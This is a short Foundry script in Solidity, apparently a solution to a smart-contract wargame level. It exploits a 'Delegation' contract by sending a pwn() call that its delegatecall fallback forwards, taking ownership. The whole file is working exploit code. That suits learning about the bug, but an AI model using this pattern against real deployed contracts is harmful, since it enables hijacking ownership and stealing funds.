// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src//Delegation.sol";

contract Level6Script is Script {
    Delegation delegation = Delegation(payable(0xA10f181473aFcDCA116522626657d9a0F5943d4F));

    function run() public {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        success;

        vm.stopBroadcast();
    }
}
